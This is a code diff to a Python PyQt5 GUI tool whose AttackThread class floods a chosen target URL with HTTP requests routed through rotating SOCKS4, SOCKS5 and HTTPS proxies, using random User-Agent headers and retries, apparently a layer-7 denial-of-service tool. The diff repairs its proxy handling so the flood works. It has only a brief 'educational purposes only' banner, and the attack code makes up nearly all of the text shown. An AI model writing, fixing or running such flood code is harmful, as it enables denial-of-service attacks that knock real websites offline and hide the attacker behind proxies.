@@ -12,7 +12,11 @@ from PyQt5.QtWidgets import (
 from PyQt5.QtGui import QPixmap
 from PyQt5.QtCore import QThread, pyqtSignal, Qt
 from io import BytesIO
-from aiohttp_socks import Socks4Addr, Socks5Addr
+try:
+    from aiohttp_socks import ProxyConnector
+except ImportError:
+    print("Please install aiohttp-socks: pip install aiohttp-socks")
+    sys.exit(1)
 
 # Legal disclaimer
 print("WARNING: This tool is for educational purposes only.")
@@ -104,15 +108,17 @@ class AttackThread(QThread):
         for attempt in range(retries):
             try:
                 ip, port = proxy.split(':')
-                if protocol == "socks4":
-                    proxy_addr = Socks4Addr(ip, int(port))
-                elif protocol == "socks5":
-                    proxy_addr = Socks5Addr(ip, int(port))
+                proxy_url = f"{protocol}://{ip}:{port}"
+                if protocol in ["socks4", "socks5"]:
+                    connector = ProxyConnector.from_url(proxy_url)
+                    async with aiohttp.ClientSession(connector=connector) as temp_session:
+                        async with temp_session.get('http://icanhazip.com', timeout=10) as response:
+                            if response.status == 200:
+                                return (proxy, protocol)
                 else:  # https
-                    proxy_addr = f"http://{ip}:{port}"
-                async with session.get('http://icanhazip.com', proxy=proxy_addr, timeout=10) as response:
-                    if response.status == 200:
-                        return (proxy, protocol)
+                    async with session.get('http://icanhazip.com', proxy=proxy_url, timeout=10) as response:
+                        if response.status == 200:
+                            return (proxy, protocol)
             except Exception as e:
                 self.log_signal.emit(f"Proxy test failed for {proxy} ({protocol}, attempt {attempt+1}/{retries}): {str(e)}")
             await asyncio.sleep(1)
@@ -134,12 +140,7 @@ class AttackThread(QThread):
             return
         async with semaphore:
             ip, port = proxy.split(':')
-            if protocol == "socks4":
-                proxy_addr = Socks4Addr(ip, int(port))
-            elif protocol == "socks5":
-                proxy_addr = Socks5Addr(ip, int(port))
-            else:  # https
-                proxy_addr = f"http://{ip}:{port}"
+            proxy_url = f"{protocol}://{ip}:{port}"
             headers = {
                 "User-Agent": random.choice(UserAgents),
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -149,11 +150,20 @@ class AttackThread(QThread):
             }
             for attempt in range(3):  # Retry up to 3 times
                 try:
-                    async with session.get(self.target_url, headers=headers, proxy=proxy_addr, timeout=12) as response:
-                        status = response.status
-                        self.log_signal.emit(f"Attack on {self.target_url} via {proxy} ({protocol}) - Status: {status}")
-                        self.success_count[protocol] += 1
-                        return
+                    if protocol in ["socks4", "socks5"]:
+                        connector = ProxyConnector.from_url(proxy_url)
+                        async with aiohttp.ClientSession(connector=connector) as temp_session:
+                            async with temp_session.get(self.target_url, headers=headers, timeout=12) as response:
+                                status = response.status
+                                self.log_signal.emit(f"Attack on {self.target_url} via {proxy} ({protocol}) - Status: {status}")
+                                self.success_count[protocol] += 1
+                                return
+                    else:  # https
+                        async with session.get(self.target_url, headers=headers, proxy=proxy_url, timeout=12) as response:
+                            status = response.status
+                            self.log_signal.emit(f"Attack on {self.target_url} via {proxy} ({protocol}) - Status: {status}")
+                            self.success_count[protocol] += 1
+                            return
                 except Exception as e:
                     self.log_signal.emit(f"Error sending request via {proxy} ({protocol}, attempt {attempt+1}/3): {str(e)}")
                     await asyncio.sleep(1)
